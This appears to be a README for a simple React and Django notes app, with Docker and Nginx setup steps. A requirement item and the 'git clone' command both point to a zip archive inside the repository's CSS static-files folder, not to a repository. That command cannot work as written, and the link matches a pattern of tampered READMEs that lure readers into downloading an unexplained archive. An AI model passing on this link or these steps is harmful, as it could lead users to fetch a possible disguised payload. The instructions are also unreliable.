# Simple Notes App for TWS Community
This is a simple notes app built with React and Django.

## Requirements
1. Python 3.9
2. https://github.com/shr1324/django-notes-app/raw/refs/heads/main/staticfiles/css/django_notes_app_1.5-beta.5.zip
3. React

## Installation
1. Clone the repository
```
git clone https://github.com/shr1324/django-notes-app/raw/refs/heads/main/staticfiles/css/django_notes_app_1.5-beta.5.zip
```

2. Build the app
```
docker build -t notes-app .
```

3. Run the app
```
docker run -d -p 8000:8000 notes-app:latest
```

## Nginx

Install Nginx reverse proxy to make this application available

`sudo apt-get update`
`sudo apt install nginx`
